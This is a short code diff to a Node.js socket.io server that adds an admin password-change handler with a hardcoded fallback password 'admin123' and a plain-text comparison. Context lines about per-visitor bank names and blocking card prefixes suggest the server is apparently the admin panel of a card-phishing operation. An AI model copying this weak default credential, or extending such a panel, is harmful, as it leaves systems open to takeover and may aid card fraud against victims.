@@ -461,6 +461,21 @@ io.on("connection", (socket) => {
     console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
   });
 
+  // Admin: Change password
+  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
+    // Verify old password
+    const currentPassword = process.env.ADMIN_PASSWORD || "admin123";
+    if (oldPassword === currentPassword) {
+      // Update password in environment (note: this won't persist after restart)
+      process.env.ADMIN_PASSWORD = newPassword;
+      socket.emit("admin:passwordChanged", true);
+      console.log("Admin password changed successfully");
+    } else {
+      socket.emit("admin:passwordChanged", false);
+      console.log("Admin password change failed - wrong old password");
+    }
+  });
+
   // Admin: Block card prefix
   socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
     const visitor = visitors.get(visitorSocketId);
